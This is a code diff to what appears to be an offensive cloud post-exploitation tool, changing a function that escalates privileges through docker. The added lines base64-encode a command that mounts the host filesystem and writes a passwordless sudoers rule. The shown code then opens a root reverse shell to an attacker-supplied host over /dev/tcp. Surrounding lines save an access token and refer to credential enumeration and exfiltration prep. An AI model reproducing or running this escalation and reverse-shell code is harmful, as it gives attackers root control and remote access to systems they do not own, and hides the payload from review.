@@ -301,8 +301,11 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
             def docker_escalate(task, reverse_shell_host, reverse_shell_port):
                 payload = f"""
 while ! command -v docker; do "echo waiting for docker..."; sleep 30; done
-echo "current user: $(whoami)"
-docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash -c 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/custom-sudoers'
+CURRENT_USER=$(whoami)
+echo "current user: $CURRENT_USER"
+COMMAND="bash -c 'echo \"$CURRENT_USER ALL=(ALL) NOPASSWD:ALL\" > /host/etc/sudoers.d/custom-sudoers'"
+PAYLOAD=$(echo -n $COMMAND | base64 -w0)
+docker run -it -v /:/host/ ubuntu:latest /bin/bash -c "echo $PAYLOAD | base64 -d | /bin/bash"
 echo "new user: $(sudo whoami)"
 echo "starting escalated reverse shell..."
 nohup /bin/sh -c 'sudo /bin/bash -c "TASK={task} /bin/bash -i >& /dev/tcp/{reverse_shell_host}/{reverse_shell_port} 0>&1"' >/dev/null 2>&1 &
@@ -622,6 +625,7 @@ echo $BUCKET_URL
                     docker_escalate(task_name, reverse_shell_host,
                                     reverse_shell_port)
                     session.log(f"session escalation call complete.")
+                    return
                 else:
                     enum_exfil_prep_creds(csp, "iam2enum")
                     session.log("running iam2enum enumeration...")
